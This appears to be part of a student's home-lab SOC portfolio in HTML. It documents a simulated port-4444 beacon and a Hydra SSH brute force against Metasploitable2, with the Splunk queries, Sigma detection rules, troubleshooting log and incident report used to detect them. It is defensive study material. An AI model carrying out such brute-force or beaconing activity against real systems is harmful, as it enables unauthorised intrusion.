+| stats avg(gap_seconds) as avg_gap_seconds, stdev(gap_seconds) as stdev_gap_seconds</pre>
+<p><strong>Result:</strong> average gap between beacon attempts: <strong>31.14 seconds</strong>. Standard deviation: <strong>1.95 seconds</strong>. Independently recalculated directly from the raw CSV (outside Splunk) to confirm accuracy — the numbers matched exactly. A standard deviation this low relative to the average gap indicates highly consistent, machine-generated timing rather than random or human-driven traffic.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-04/05-KEY-splunk-periodicity-query-result.png"/>
+  <div class="caption">Figure 5.5 — Splunk query result: 31.14-second average interval, 1.95-second standard deviation — quantified proof of periodicity.</div>
+</div>
+
+<h3>Investigation Questions</h3>
+<table>
+  <tr><th>Question</th><th>Answer</th></tr>
+  <tr><td>Why is this connection anomalous?</td><td>A host repeatedly initiating outbound connections to the same destination at near-identical intervals is not typical of normal user-driven traffic, which tends to be irregular and bursty.</td></tr>
+  <tr><td>What port was used, and is it commonly allowed or overlooked?</td><td>Port 4444 was used for lab simplicity; real C2 traffic typically uses a commonly allowed port like 443 or 53 to blend in. This is a limitation of the simulation.</td></tr>
+  <tr><td>How long did each connection stay open, and was data transferred?</td><td>The two successful connections completed a full handshake and delivered a small "beacon" payload before closing normally. The six later attempts were refused immediately with no data transferred.</td></tr>
+  <tr><td>What baseline would production need to detect this?</td><td>A defined standard-deviation ceiling across a minimum number of repeated connections to the same destination, to distinguish beaconing from coincidentally regular legitimate traffic like an OS update checker.</td></tr>
+</table>
+
+<h3>MITRE ATT&amp;CK Mapping</h3>
+<table>
+  <tr><th>Technique</th><th>Name</th><th>Justification</th></tr>
+  <tr><td>T1071</td><td>Application Layer Protocol</td><td>The beacon used a TCP connection to simulate an application-layer C2 channel</td></tr>
+  <tr><td>T1571</td><td>Non-Standard Port</td><td>Port 4444 is a well-known non-standard port commonly associated with C2 tooling</td></tr>
+</table>
+
+<h3>Remediation Recommendations</h3>
+<p><strong>Problem:</strong> During testing, the target machine was able to send repeated outbound connections to an external address with no restriction or monitoring in place. A script made connection attempts to that address every 31 seconds, and nothing on the network flagged this pattern.</p>
+<p><strong>Why it matters:</strong> If this had been real malware instead of a test script, this beaconing pattern would mean the machine is already compromised and is maintaining ongoing contact with an attacker's command server. Without detection, the attacker could continue sending it instructions, pull data out of the network, or trigger further attacks like ransomware at any time.</p>
+<p><strong>Fix:</strong> Implement monitoring for outbound traffic that connects to the same destination at consistent, repeating time intervals, using the same logic demonstrated in this investigation. Once a low-variance, repeating pattern is identified, it should trigger an alert for investigation, or be blocked outright if the destination is unrecognized or unapproved.</p>
+
+<div class="scenario-break"></div>
+<h1>6. Failures, Troubleshooting, and How They Were Resolved</h1>
+<p>Real lab work does not go in a straight line. This section documents every real technical failure encountered across all four scenarios, and exactly how each was diagnosed and resolved — because a portfolio with zero rough edges usually reads as either fabricated or superficial, and the diagnostic process itself is evidence of real analytical skill.</p>
+
+<table>
+  <tr><th>Failure</th><th>Diagnosis and Resolution</th></tr>
+  <tr><td>Kali and Metasploitable2 IPs reset on every VM reboot</td><td>Documented the exact <code>ip addr add</code> / <code>ip link set</code> commands required after every reboot; built this into the standard startup procedure for every scenario.</td></tr>
+  <tr><td>Kali's IP accidentally set to the same address as the target (.20) after a reboot</td><td><code>ping</code> falsely succeeded (Kali pinging itself) while curl/HTTP failed outright with "0 ms, could not connect." Diagnosed via <code>ip addr show | grep 192.168.50</code>, resolved with <code>ip addr del 192.168.50.20/24 dev eth0</code> followed by re-adding the correct address.</td></tr>
+  <tr><td>Splunk auto-detected the wrong sourcetype for the SSH auth log</td><td>Manually overrode the sourcetype to <code>linux_secure</code> during upload, and verified event parsing in the preview pane before proceeding to detection logic.</td></tr>
+  <tr><td>Splunk did not auto-extract the source IP field from the raw auth log</td><td>Built a manual <code>rex</code> field extraction (<code>rex field=_raw "from (?&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"</code>) into the SPL query rather than relying on automatic field discovery.</td></tr>
+  <tr><td>Splunk alert repeatedly failed to save with error "enable at least one action"</td><td>Root-caused to a missing trigger action; resolved by explicitly adding a trigger action (Add to Triggered Alerts) before saving. This recurred in a later session and was resolved the same way both times.</td></tr>
+  <tr><td>Beacon command pasted into Metasploitable2 terminal failed with "command not found" / "Broken pipe" errors</td><td>Diagnosed as a clipboard paste issue splitting the command across lines, causing part of it to execute as a separate command. Resolved by typing the command manually instead of pasting.</td></tr>
+  <tr><td>Metasploitable2 (Ubuntu 8.04) does not have the <code>timeout</code> binary installed</td><td>Attempted <code>sudo apt-get install timeout</code>, which failed since the package doesn't exist under that name and the machine has no internet access anyway (isolated labnet). Used netcat's own built-in <code>-w</code> connection-timeout flag instead (<code>nc -w 2</code>), achieving the same effect without requiring any package install.</td></tr>
+  <tr><td>Netcat's <code>-k</code> flag did not keep the Kali listener alive across multiple connections as documented</td><td>The listener dropped back to a fresh prompt after each connection closed, requiring manual restarts throughout the beacon capture. Confirmed via Wireshark that the underlying beacon traffic pattern was completely unaffected by the listener's behavior — the capture ran continuously and independently regardless.</td></tr>
+  <tr><td>Beacon connections were refused after the first two successful check-ins</td><td>Diagnosed as a listener-availability issue (see above), not a beacon-timing issue. Confirmed the beacon continued attempting to connect on the exact same ~30-second schedule regardless of refusal — itself documented as realistic malware behavior, since a compromised host will continue phoning home even when its C2 server is temporarily unreachable.</td></tr>
+  <tr><td>Wireshark CSV export needed to move from Kali to the Windows host running Splunk, with no shared network path available</td><td>Attempted a VirtualBox host-only adapter on Kali, which was found disabled and misconfigured (set to NAT instead of Host-only). Rather than reconfigure networking for a one-time file transfer, used the VirtualBox shared clipboard instead: printed the file contents to the terminal with <code>cat</code>, copied the output, and pasted it into Notepad on Windows, saving with "All Files" type to avoid an unwanted <code>.txt</code> extension being appended.</td></tr>
+  <tr><td>GitHub push rejected with "non-fast-forward" error</td><td>Ran <code>git fetch origin</code> and <code>git --no-pager log origin/main --oneline</code> to inspect the actual difference rather than force-pushing blindly. Found the remote had one additional commit (an edit to <code>lessons-learned.md</code>) not present locally. Verified the remote file's actual content before proceeding — confirmed it was empty — and only then performed a force-push, since blindly overwriting without checking first could have destroyed real content.</td></tr>
+  <tr><td>Git push failed with "src refspec main does not match any"</td><td>The local repository's default branch was still named <code>master</code> rather than <code>main</code>. Resolved with <code>git branch -M main</code> before pushing.</td></tr>
+</table>
+
+<div class="figure">
+  <img src="evidence/troubleshooting/01-KEY-root-cause-ip-conflict-found.png"/>
+  <div class="caption">Figure 6.1 — Root cause identified: <code>ip addr show</code> confirming Kali's IP had been misconfigured to .20, matching the target.</div>
+</div>
+<div class="figure">
+  <img src="evidence/troubleshooting/02-KEY-ip-conflict-fixed.png"/>
+  <div class="caption">Figure 6.2 — IP conflict resolved: the incorrect address removed and the correct address (.10) re-applied.</div>
+</div>
+<div class="figure">
+  <img src="evidence/troubleshooting/03-KEY-connectivity-restored.png"/>
+  <div class="caption">Figure 6.3 — Connectivity confirmed restored following the fix.</div>
+</div>
+<div class="figure">
+  <img src="evidence/github-setup/01-KEY-git-push-success.png"/>
+  <div class="caption">Figure 6.4 — Successful final push to GitHub after resolving the branch-naming and non-fast-forward issues.</div>
+</div>
+
+<div class="scenario-break"></div>
+<h1>7. Detection Engineering Reference</h1>
+
+<h3>Consolidated SPL Queries</h3>
+<p><strong>Scenario 2 — SSH Brute Force Detection:</strong></p>
+<pre>index=main sourcetype=linux_secure "Failed password"
+| rex field=_raw "from (?&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"
+| bin _time span=5m
+| stats count by src_ip, _time
+| where count &gt; 5</pre>
+<p>A threshold of more than 5 failures in a 5-minute window was chosen because it sits well above what a legitimate human user would generate by mistyping a password — typically 1 to 3 attempts before either succeeding or giving up. For a service account rather than a human user, this threshold would likely need to be set lower (e.g., &gt;2 or &gt;3 in 5 minutes), since automated service accounts typically don't fail authentication at all under normal operation.</p>
+
+<p><strong>Scenario 4 — Periodic Beacon Detection:</strong></p>
+<pre>index=main source="scenario4-beacon-connections.csv" Info="*[SYN]*" extracted_Source="192.168.50.20"
+| table Time
+| sort Time
+| delta Time as gap_seconds
+| stats avg(gap_seconds) as avg_gap_seconds, stdev(gap_seconds) as stdev_gap_seconds</pre>
+<p>No fixed count-based threshold was used here, since this detection is based on timing consistency rather than volume. A production deployment would need a defined standard-deviation ceiling to formally distinguish genuine beaconing from coincidentally regular legitimate traffic.</p>
+
+<h3>Field Extraction Notes</h3>
+<p>Scenario 2's log data required manual field extraction via <code>rex</code>, since Splunk's automatic field extraction did not recognize the source IP within the raw <code>auth.log</code> line format. Scenario 4's data was uploaded as a structured CSV export from Wireshark, which Splunk automatically parsed into individual fields per column, requiring no manual <code>rex</code> extraction. This is a genuine, worth-noting difference in approach depending on log source structure.</p>
+
+<h3>Sigma Rule Translations</h3>
+<p>Vendor-agnostic Sigma rule translations of both SPL-based detections were authored for portability to any SIEM:</p>
+<pre>title: SSH Brute Force - Repeated Authentication Failures
+status: test
+logsource:
+  product: linux
+  service: auth
+detection:
+  selection:
+    message|contains: 'Failed password'
+  timeframe: 5m
+  condition: selection | count(src_ip) by src_ip &gt; 5
+falsepositives:
+  - Legitimate user repeatedly mistyping a password
+  - Misconfigured automated service account retrying a stale credential
+level: high
+tags:
+  - attack.credential_access
+  - attack.t1110.001</pre>
+<pre>title: Periodic Outbound Beacon - Consistent Connection Interval
+status: experimental
+logsource:
+  category: network_connection
+detection:
+  selection:
+    dst_port: 4444
+  timeframe: 24h
+  condition: selection | stdev(time_delta) by src_ip, dst_ip &lt; 2
+falsepositives:
+  - Scheduled software update checkers
+  - License validation or heartbeat health-check agents
+level: medium
+tags:
+  - attack.command_and_control
+  - attack.t1071
+  - attack.t1571</pre>
+
+<div class="scenario-break"></div>
+<h1>8. Consolidated Incident Report — INC-001</h1>
+<p><strong>Title:</strong> INC-001: SSH Brute Force Against Metasploitable2 &nbsp;&middot;&nbsp; <strong>Analyst:</strong> Rithika Gowdelli &nbsp;&middot;&nbsp; <strong>Status:</strong> Final</p>
+
+<h3>Executive Summary</h3>
+<p>A brute-force authentication attack was simulated against the SSH service on an isolated lab target (Metasploitable2, 192.168.50.20) using Hydra with a leaked password wordlist. The attack generated 1,694 failed login attempts from a single source IP (192.168.50.10). The activity was detected in Splunk using a custom SPL query that flagged any source IP exceeding 5 failed attempts within a 5-minute window, identifying two distinct attack windows (1,041 and 653 failures). The finding was independently confirmed at the network packet level via Wireshark, which captured 1,679 packets matching the same SSH traffic. This was a controlled, deliberate test; no real compromise occurred, and the activity is confirmed true positive by design.</p>
+
+<h3>Root Cause Analysis</h3>
+<p>Metasploitable2 is an intentionally vulnerable lab target with no rate-limiting, account lockout, or connection-throttling controls on its SSH service by design. This allowed Hydra to make 1,694 login attempts without any pushback or slowdown from the target. This finding demonstrates the analysis and detection method rather than representing a real-world root cause discovery, since the underlying vulnerability was intentionally built into the target for this lab exercise.</p>
+
+<h3>Impact Assessment</h3>
+<p>In a real environment with a weak or common password on the targeted account, this volume of unrestricted login attempts would very likely have succeeded eventually, granting the attacker full account access and, depending on the account's privileges, potential root-level control of the system. From there, an attacker could establish persistence, move laterally to other systems on the network, or exfiltrate data. Even without a successful login, this volume of failed authentication traffic represents a real load on the target system and a clear signal that should trigger investigation in any monitored environment.</p>
+
+<h3>Analyst Notes</h3>
+<ul>
+  <li>The ingested log data spanned two calendar days (July 4 and July 5), rather than a single tight window. This was not fully resolved during this investigation — it's unclear whether this reflects multiple separate attack runs concatenated into one log file, or a single longer-running session than initially assumed.</li>
+  <li>Splunk's automatic field extraction did not recognize the source IP within the raw log line, requiring a manual <code>rex</code> extraction — a good example of why understanding Splunk's field extraction mechanics matters beyond just running a search.</li>
+  <li>The alert-save error ("enable at least one action") had occurred in a prior session as well and was resolved the same way both times, by adding a trigger action before saving. This appears to be a recurring Splunk UI behavior rather than a one-off issue.</li>
+</ul>
+
+<div class="scenario-break"></div>
+<h1>9. MITRE ATT&amp;CK Summary — All Scenarios</h1>
+<table>
+  <tr><th>Technique ID</th><th>Name</th><th>Scenario</th><th>Justification</th></tr>
+  <tr><td>T1595</td><td>Active Scanning</td><td>1</td><td>Nmap actively probed 1,000 ports against the target to identify live services</td></tr>
+  <tr><td>T1046</td><td>Network Service Discovery</td><td>1</td><td>Service/version detection fingerprinted exact software versions on every open port</td></tr>
+  <tr><td>T1110.001</td><td>Brute Force: Password Guessing</td><td>2</td><td>Hydra systematically tried a leaked password list against a single known username via SSH</td></tr>
+  <tr><td>T1021.004</td><td>Remote Services: SSH</td><td>2</td><td>The targeted service was SSH remote login</td></tr>
+  <tr><td>T1595.003</td><td>Active Scanning: Wordlist Scanning</td><td>3</td><td>Gobuster systematically requested 4,613 paths from a wordlist against the target web server</td></tr>
+  <tr><td>T1592</td><td>Gather Victim Host Information</td><td>3</td><td>phpinfo.php disclosure provided detailed software version and file path information with no exploitation required</td></tr>
+  <tr><td>T1071</td><td>Application Layer Protocol</td><td>4</td><td>The simulated beacon used a TCP connection to communicate with the listener, simulating an application-layer C2 channel</td></tr>
+  <tr><td>T1571</td><td>Non-Standard Port</td><td>4</td><td>Port 4444 is a well-known non-standard port commonly associated with C2 tooling in real-world attacks</td></tr>
+</table>
+
+<div class="scenario-break"></div>
+<h1>10. Lessons Learned</h1>
+<p class="status-pending">Pending final write-up.</p>
+
+<h1>11. Future Improvements</h1>
+<ul>
+  <li>Extend Splunk correlation to Scenario 1 (port scan) and Scenario 3 (HTTP enumeration), which currently rely on Wireshark and tool output alone</li>
+  <li>Add a pfSense instance in front of the target to generate firewall-level logs as an additional detection layer</li>
+  <li>Expand the Scenario 4 beacon simulation to use a commonly allowed port (443 or 53) to more realistically simulate C2 traffic blending in with legitimate traffic</li>
+  <li>Automate the standard IP-reset procedure with a startup script to remove the manual step after every VM reboot</li>
+  <li>Build a Splunk dashboard consolidating all four scenarios' detections into a single view</li>
+</ul>
+
+</body>
+</html>
